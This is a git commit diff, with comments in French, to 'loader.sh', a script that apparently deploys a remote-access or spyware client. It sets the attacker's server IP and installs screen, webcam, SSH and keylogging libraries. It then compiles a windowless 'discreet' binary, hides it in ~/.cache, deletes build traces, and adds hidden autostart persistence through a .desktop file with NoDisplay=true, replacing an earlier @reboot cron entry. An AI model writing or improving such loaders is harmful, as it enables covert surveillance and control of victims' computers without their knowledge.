5a69101ec636263725e1f0cce7f795e42a9db7d7
kriooxx <voisin.maxime@yahoo.fr>
2025-07-03 15:09:42 +0200

    amélioration loader.sh

--- loader.sh
+++ loader.sh
@@ -6,15 +6,28 @@ read -p "Entrez l'IP du serveur : " server_ip
 #remplace la valeur de l'ip server dans client.py
 sed -i "s/HOST = .*/HOST = \"$server_ip\"/g" client/client.py
 
+
 #installe PyInstaller
 if ! command -v pyinstaller &> /dev/null; then
-    echo "[+] Installation de PyInstaller..."
-    pip install pyinstaller &>/dev/null
+    echo "[+] Installation de Python3, pip3 et PyInstaller..."
+    sudo apt update &>/dev/null
+    sudo apt install -y python3 python3-pip python3-tk python3-dev &>/dev/null
+    pip3 install pyinstaller --break-system-packages &>/dev/null
 fi
+
+#installe toutes les lib du client.py
+echo "[+] Installation des librairies de client.py..."
+pip3 install paramiko --break-system-packages &>/dev/null
+pip3 install pyautogui --break-system-packages &>/dev/null
+pip3 install opencv-python --break-system-packages &>/dev/null
+pip3 install pillow --break-system-packages &>/dev/null
+pip3 install pynput --break-system-packages &>/dev/null
+
+
 
 #compilation du binaire via PyInstaller
 echo "[+] Compilation du client.py en binaire discret..."
-pyinstaller --onefile --noconsole client/client.py &>/dev/null
+python3 -m PyInstaller --onefile --noconsole client/client.py &>/dev/null
 
 #cache le binaire
 mkdir -p ~/.cache/.clientbin
@@ -23,11 +36,21 @@ mv dist/client ~/.cache/.clientbin/
 #supprimer les traces 
 rm -rf build dist __pycache__ client.spec
 
-
+#droit d'execution du binaire
 chmod +x ~/.cache/.clientbin/client
 
-#création d'un crontab au démarrage 
-(crontab -l 2>/dev/null | grep -v "~/.cache/.clientbin/client"; echo "@reboot ~/.cache/.clientbin/client &>/dev/null &") | crontab -
+#création d'un .desktop au démarrage
+mkdir -p ~/.config/autostart
+
+cat > ~/.config/autostart/client.desktop <<EOF
+[Desktop Entry]
+Type=Application
+Name=Client
+Exec=$HOME/.cache/.clientbin/client
+Hidden=false
+NoDisplay=true
+X-GNOME-Autostart-enabled=true
+EOF
 
 #execute le binaire
 echo "[+] Exécution directe du binaire..."
